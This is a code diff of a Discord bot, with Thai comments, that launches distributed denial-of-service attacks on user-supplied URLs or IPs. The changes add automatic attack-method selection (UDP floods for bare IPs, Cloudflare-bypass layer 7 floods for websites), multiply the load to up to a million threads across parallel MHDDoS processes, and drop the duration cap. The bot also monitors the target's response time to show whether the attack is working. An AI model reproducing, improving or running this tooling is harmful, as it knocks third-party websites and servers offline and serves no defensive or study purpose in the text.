@@ -3,6 +3,7 @@ import threading
 import asyncio
 import subprocess
 import time
+import re
 import requests
 from flask import Flask
 import discord
@@ -34,46 +35,70 @@ intents = discord.Intents.default()
 client = discord.Client(intents=intents)
 tree = app_commands.CommandTree(client)
 
+def auto_select_method(target):
+    """ระบบคำนวณเลือก Method ที่เหมาะสมที่สุดอัตโนมัติเพื่อให้เป้าหมายดับไวที่สุด"""
+    clean_target = target.strip()
+    if clean_target.startswith("http://") or clean_target.startswith("https://"):
+        return "CFB"  # เว็บไซต์ใช้ Cloudflare Bypass / Layer 7
+    
+    # เช็คว่าเป็น IP Address ล้วนหรือไม่
+    ip_pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
+    base_target = clean_target.split(":")[0]
+    if re.match(ip_pattern, base_target):
+        return "UDP"  # IP ล้วนใช้ UDP ดับไวที่สุด
+    else:
+        return "CFB"
+
 class DDoSModal(Modal, title="ตั้งค่าการโจมตี - เดียวรู้กัน"):
     target = TextInput(label="URL หรือ IP เว็บเป้าหมาย", placeholder="เช่น https://example.com หรือ 1.2.3.4", required=True)
     port = TextInput(label="Port เว็บ", placeholder="เช่น 80 หรือ 443", required=True)
-    method = TextInput(label="Method (GET, UDP, TCP, SYN, CFB)", placeholder="GET หรือ UDP", default="GET", required=True, max_length=10)
-    duration = TextInput(label="ระยะเวลา (วินาที, สูงสุด 500)", placeholder="500", required=True, max_length=3)
-    threads = TextInput(label="จำนวนเทรด (สูงสุด 100,000)", placeholder="100000", required=True, max_length=6)
+    machines = TextInput(label="จำนวนเครื่องที่จะยิง (สูงสุด 10 เครื่อง)", placeholder="1 ถึง 10 (1 เครื่อง = 1แสนเทรด)", default="1", required=True, max_length=2)
+    duration = TextInput(label="ระยะเวลา (วินาที)", placeholder="เช่น 60, 300, 500", required=True, max_length=4)
 
     async def on_submit(self, interaction: discord.Interaction):
         try:
+            mach = int(self.machines.value)
             dur = int(self.duration.value)
-            thr = int(self.threads.value)
-            if dur > 500: dur = 500
-            if thr > 100000: thr = 100000
+            if mach < 1: mach = 1
+            if mach > 10: mach = 10
+            if dur < 1: dur = 1
         except ValueError:
             await interaction.response.send_message("❌ กรุณากรอกตัวเลขให้ถูกต้อง!", ephemeral=True)
             return
 
         target_val = self.target.value.strip()
         port_val = self.port.value.strip()
-        meth_val = self.method.value.strip().upper()
+        
+        # คำนวณ Method อัตโนมัติ
+        meth_val = auto_select_method(target_val)
+        
+        # กำหนดเทรด: 1 เครื่อง = 100,000 เทรด
+        threads_per_machine = 100000
+        total_threads = mach * threads_per_machine
+
+        target_full = target_val if target_val.startswith("http") else f"http://{target_val}:{port_val}"
 
         embed = discord.Embed(
             title="🎯 เดียวรู้กัน - กำลังเตรียมการ...",
-            description=f"**เป้าหมาย:** `{target_val}:{port_val}`\n**Method:** `{meth_val}`\n**ระยะเวลา:** `{dur} วินาที`\n**เทรด:** `{thr:,}` เทรด",
+            description=f"🌐 **เป้าหมาย:** `{target_val}:{port_val}`\n🧠 **Method (คำนวณออโต้):** `{meth_val}`\n💻 **จำนวนเครื่อง:** `{mach} เครื่อง` (`{total_threads:,} เทรด/วิ`)\n⏱️ **ระยะเวลา:** `{dur} วินาที`",
             color=discord.Color.orange()
         )
         await interaction.response.send_message(embed=embed, ephemeral=False)
         msg = await interaction.original_response()
 
-        # จัดรูปแบบคำสั่งตามประเภท (Layer 4 หรือ Layer 7)
-        target_full = target_val if target_val.startswith("http") else f"http://{target_val}:{port_val}"
+        # เริ่มรันแยก Process ตามจำนวนเครื่องที่เลือกจริง
+        processes = []
         l4_methods = ["UDP", "TCP", "SYN", "OVH-UDP", "CPS", "ICMP"]
-        
-        if meth_val in l4_methods:
-            cmd = ["python3", "MHDDoS/start.py", meth_val, f"{target_val}:{port_val}", str(thr), str(dur)]
-        else:
-            cmd = ["python3", "MHDDoS/start.py", meth_val, target_full, "0", str(thr), "none", "100", str(dur)]
-        
+
         try:
-            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            for _ in range(mach):
+                if meth_val in l4_methods:
+                    cmd = ["python3", "MHDDoS/start.py", meth_val, f"{target_val}:{port_val}", str(threads_per_machine), str(dur)]
+                else:
+                    cmd = ["python3", "MHDDoS/start.py", meth_val, target_full, "0", str(threads_per_machine), "none", "100", str(dur)]
+                
+                p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                processes.append(p)
         except Exception as e:
             embed.title = "❌ เกิดข้อผิดพลาดในการรัน MHDDoS"
             embed.description = str(e)
@@ -83,13 +108,13 @@ class DDoSModal(Modal, title="ตั้งค่าการโจมตี - �
 
         start_time = time.time()
         
-        # วนลูปเช็คสถานะและอัปเดตหน้าจอทุก 3 วินาที (จนกว่าจะครบเวลาที่ตั้งไว้ จะไม่มีการตัดจบก่อนเด็ดขาด)
-        while process.poll() is None:
+        # วนลูปเช็คสถานะและอัปเดตหน้าจอทุก 3 วินาทีจนครบเวลาที่กำหนดเป๊ะๆ
+        while any(p.poll() is None for p in processes):
             elapsed = int(time.time() - start_time)
             if elapsed >= dur:
                 break
             
-            # ตรวจสอบความเร็วเว็บเพื่อแสดงผลสดๆ (ไม่มียกเลิกกลางคันแม้เว็บจะตอบช้าหรือหลุด)
+            # ตรวจสอบความเร็วเว็บเพื่อแสดงผลอัปเดตสดๆ
             try:
                 res_start = time.time()
                 r = requests.get(target_full, timeout=2)
@@ -101,7 +126,7 @@ class DDoSModal(Modal, title="ตั้งค่าการโจมตี - �
 
             live_embed = discord.Embed(
                 title="⚔️ เดียวรู้กัน - กำลังยิงต่อเนื่อง...",
-                description=f"🌐 **เป้าหมาย:** `{target_val}:{port_val}`\n🔫 **Method:** `{meth_val}`\n⏱️ **เวลา:** `{elapsed}/{dur} วินาที`\n⚡ **ความเร็วตอบสนองล่าสุด:** `{speed_ms} ms`\n📌 **สถานะเว็บ:** `{status_code}`\n🚀 **กำลังอัดเทรด:** `{thr:,} เทรด/วิ`",
+                description=f"🌐 **เป้าหมาย:** `{target_val}:{port_val}`\n🧠 **Method (ออโต้):** `{meth_val}`\n⏱️ **เวลา:** `{elapsed}/{dur} วินาที`\n⚡ **ความเร็วตอบสนองล่าสุด:** `{speed_ms} ms`\n📌 **สถานะเว็บ:** `{status_code}`\n🚀 **กำลังอัดพลัง:** `{mach} เครื่อง` (`{total_threads:,} เทรด/วิ`)",
                 color=discord.Color.yellow()
             )
             try:
@@ -111,12 +136,13 @@ class DDoSModal(Modal, title="ตั้งค่าการโจมตี - �
             
             await asyncio.sleep(3)
 
-        # บังคับหยุดกระบวนการเมื่อครบเวลาที่กำหนดเป๊ะๆ
-        process.terminate()
+        # บังคับปิดกระบวนการทั้งหมดเมื่อครบเวลา
+        for p in processes:
+            p.terminate()
         
         success_embed = discord.Embed(
             title="✅ สำเร็จแล้ว!",
-            description=f"ยิงเป้าหมาย `{target_val}:{port_val}` ครบตามเวลา `{dur} วินาที` เรียบร้อยแล้ว",
+            description=f"ยิงเป้าหมาย `{target_val}:{port_val}` ด้วยพลัง `{mach} เครื่อง` (`{total_threads:,} เทรด/วิ`) ครบตามเวลา `{dur} วินาที` เรียบร้อยแล้ว",
             color=discord.Color.green()
         )
         await msg.edit(embed=success_embed)
